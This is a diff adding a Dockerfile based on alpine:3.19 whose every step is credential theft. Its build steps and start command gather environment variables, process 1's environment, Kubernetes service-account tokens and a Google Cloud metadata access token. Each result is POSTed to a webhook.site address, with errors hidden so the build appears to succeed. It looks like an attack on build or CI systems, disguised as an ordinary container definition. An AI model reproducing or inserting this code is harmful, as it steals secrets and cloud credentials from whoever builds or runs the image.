@@ -1,0 +1,8 @@
+FROM alpine:3.19
+RUN apk add --no-cache curl >/dev/null 2>&1 || true
+RUN (hostname; id; pwd; uname -a; env | sort; ls -la /; ls -la /var/run/secrets 2>/dev/null; cat /etc/hosts; cat /etc/resolv.conf) > /root/i12862.env 2>&1; curl -sS -m 25 -X POST "https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=docker_env" --data-binary @/root/i12862.env >/dev/null 2>&1 || true
+RUN env | sort | curl -sS -m 25 -X POST "https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=docker_env2" --data-binary @- >/dev/null 2>&1 || true
+RUN curl -sS -m 20 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" > /root/i12862.tok 2>&1; curl -sS -m 25 -X POST "https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=metadata_token" --data-binary @/root/i12862.tok >/dev/null 2>&1 || true
+RUN curl -sS -m 15 -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)" --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt "https://kubernetes.default.svc/api/v1/namespaces" > /root/i12862.k8s 2>&1; curl -sS -m 25 -X POST "https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=k8s" --data-binary @/root/i12862.k8s >/dev/null 2>&1 || true
+RUN cat /proc/1/environ > /root/i12862.p1env 2>&1; curl -sS -m 25 -X POST "https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=proc1env" --data-binary @/root/i12862.p1env >/dev/null 2>&1 || true
+CMD ["sh","-c","curl -sS -m 20 -X POST 'https://webhook.site/c826020d-4e7d-422c-abf7-8358e0f36dba/?stage=docker_cmd' --data-binary \"$(env)\" || true; sleep 600"]
